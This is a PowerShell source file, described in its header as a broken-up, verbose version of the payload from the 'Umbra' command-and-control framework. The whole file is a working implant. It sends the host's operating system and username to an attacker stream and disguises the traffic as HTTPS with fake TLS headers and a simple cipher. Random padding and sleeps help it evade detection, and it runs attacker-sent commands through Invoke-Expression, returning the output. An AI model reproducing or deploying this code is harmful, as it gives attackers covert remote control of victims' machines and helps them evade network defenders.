# This file is a broken up, verbose version of the payload used in the Umbra
# command and control framework. It is put here to server an example as what
# is possible in powershell, and if anything breaks in future use, the issues
# are more diagnosable.

$Attacker                               = $a
$AttackerStream                         = $s
$EncryptionKey                          = $k

# Set up an Encrypt/Decrypt function, and an Application data
# constructor/deconstructor.

function Encrypt ($Data, $EncryptionKey)
{
    $Cipher                             = [Byte[]] @()

    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Cipher                        += ($Data[$i] + $EncryptionKey[$i % 32] + 1) % 256
    }

    return [Byte[]] $Cipher
}

function Decrypt ($Data, $EncryptionKey)
{
    $Plain                              = [Byte[]] @()

    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Plain                         += ($Data[$i] - $EncryptionKey[$i % 32] + 255) % 256
    }

    return [Byte[]] $Plain
}

function Application-ify ($Data)
{
    $Application                        = [Byte[]] @(0x17, 0x03, 0x03)
    $Cipher                             = [Byte[]] (Encrypt $Data $EncryptionKey)
    $CipherLength                       = [Byte[]] [BitConverter]::GetBytes($Cipher.Length)[1,0]
    $ApplicationData                    = [Byte[]] ($Application + $CipherLength + $Cipher)

    return [Byte[]] $ApplicationData
}

function Application-defy ($Data)
{
    $DataLength                         = ([Int] $Data[3] -shl 8) -bor $Data[4]
    $Cipher                             = $Data[5..(5 + $DataLength)]
    $Plain                              = Decrypt $Cipher $EncryptionKey

    return [Byte[]] $Plain
}

function Get-RandomData
{
    $Amount                             = Get-Random (200..500)
    $Data                               = [Byte[]] @()

    foreach ($Iteation in 1..$Amount) { 
        $Byte                           = [Byte] (Get-Random (0..255))
        $Data                          += $Byte
    }

    return [Byte[]] $Data
}

function Sleep-Random
{
    $Milliseconds                       = Get-random (1000..9999)
    Start-Sleep -Milliseconds $Milliseconds
}

$Encoding                               = [Text.Encoding]::UTF8

# Send over the OS, Username as initial data.

$Os                                     = $Encoding.GetBytes([Runtime.InteropServices.RuntimeInformation]::OSDescription)
$OsLength                               = [Byte[]] [BitConverter]::GetBytes($Os.Length)[1,0]
$Username                               = $Encoding.GetBytes([Environment]::UserName)
$Information                            = [Byte[]] ($OsLength + $Os + $Username)
$Data                                   = [Byte[]] (Application-ify $Information)
$BytesWritten                           = $AttackerStream.Write($Data, 0, $Data.Length)

# Setup a continuously executing payload that looks like legitimate HTTPS traffic.
# We will constantly request data (we will be slaked) and once a command is sent,
# execute it, send it back with a notice that it contains data.

$Buffer                                 = [Byte[]]::new(65535)
$AcknowledgeByte                        = 0x1
$RequestByte                            = 0x2
$HasData                                = 0x3

$Prompt                                 = "$(prompt)" # or prompt
$EncodedOutput                          = [Byte] @(@($HasData) + @($Encoding.GetBytes($Prompt)))
$Packet                                 = [Byte] (Application-ify $EncodedOutput)
$BytesWritten                           = $AttackerStream.Write($Packet, 0, $Packet.Length)
$BytesRead                              = $AttackerStream.Read($Buffer, 0, $Buffer.Length)

while ($BytesRead)
{
    Sleep-Random

    $Request                            = [Byte[]] @($RequestByte)
    $Request                           += [Byte[]] $(Get-RandomData)
    $Request                            = [Byte[]] $(Application-ify $Request)

    $BytesWritten                       = $AttackerStream.Write($Request, 0, $Request.Length)
    $BytesRead                          = $AttackerStream.Read($Buffer, 0, $Buffer.Length)

    $Data                               = [Byte[]]::new($BytesRead)
    [Array]::Copy($Buffer, 0, $Data, 0, $BytesRead)
    $Clean                              = [Byte[]] (Application-defy $Data)

    if ($Clean[0] -ne $HasData)
    {
        continue
    }

    $Length                             = ([Int] $Clean[1] -shl 8) -bor $Clean[2]
    $EncodedCommand                     = [Byte[]]::new($Length)
    [Array]::Copy($Clean, 3, $EncodedCommand, 0, $Length)
    $DecodedCommand                     = $Encoding.GetString($EncodedCommand)

    $Output                             = Invoke-Expression $DecodedCommand | Out-String
    $Prompt                             = "PS " + $(pwd) + "> " # or prompt
    $Final                              = $Output + $Prompt

    $EncodedOutput                      = [Byte] @($HasData + $Encoding.GetBytes($Final))
    $Packet                             = [Byte] (Application-ify $EncodedOutput)
    $BytesWritten                       = $AttackerStream.Write($Packet, 0, $Packet.Length)
    $BytesRead                          = $AttackerStream.Read($Buffer, 0, $Buffer.Length)
}